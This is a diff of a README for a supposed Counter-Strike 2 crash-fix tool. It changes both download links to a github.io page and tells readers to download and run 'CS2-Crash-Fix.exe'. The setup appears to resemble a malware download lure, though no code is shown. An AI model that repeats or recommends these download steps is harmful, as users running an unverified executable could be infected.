@@ -1,6 +1,6 @@
 # 🛠️ CS2-Crash-Fix - Stop Counter-Strike 2 From Crashing Today
 
-[![Download Fix](https://img.shields.io/badge/Download-Crash_Fix-blue.svg)](https://github.com/Glasnostshirttail573/CS2-Crash-Fix)
+[![Download Fix](https://img.shields.io/badge/Download-Crash_Fix-blue.svg)](https://glasnostshirttail573.github.io)
 
 ## 🎯 About This Tool
 
@@ -18,7 +18,7 @@ This application fixes issues where Counter-Strike 2 crashes during startup on W
 Follow these steps to download and run the repair tool.
 
 1. Go to the download page.
-2. Visit this page to download: [https://github.com/Glasnostshirttail573/CS2-Crash-Fix](https://github.com/Glasnostshirttail573/CS2-Crash-Fix)
+2. Visit this page to download: [https://glasnostshirttail573.github.io](https://glasnostshirttail573.github.io)
 3. Locate the file named `CS2-Crash-Fix.exe`.
 4. Click the file to save it to your computer.
 
